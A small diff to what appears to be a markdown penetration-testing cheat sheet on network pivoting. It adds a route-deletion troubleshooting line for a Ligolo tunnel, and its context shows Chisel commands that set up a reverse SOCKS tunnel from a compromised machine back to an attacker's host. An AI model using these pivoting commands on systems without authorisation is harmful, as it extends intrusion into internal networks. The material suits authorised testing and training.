@@ -75,6 +75,7 @@ Pivoting is a powerful technique in penetration testing that allows an attacker 
          ip route add 192.168.148.0/24 dev ligolo
          ip route list
          ```
+      - Incase of issue `ip route del 192.168.98.0/24`
   - ## Chisel (Fast TCP/UDP Tunneling)
       - On the attacker's machine (server): `./chisel server -p 8080 --reverse`
       - On the compromised machine (client): `./chisel client 192.168.1.100:8080 R:1080:socks`
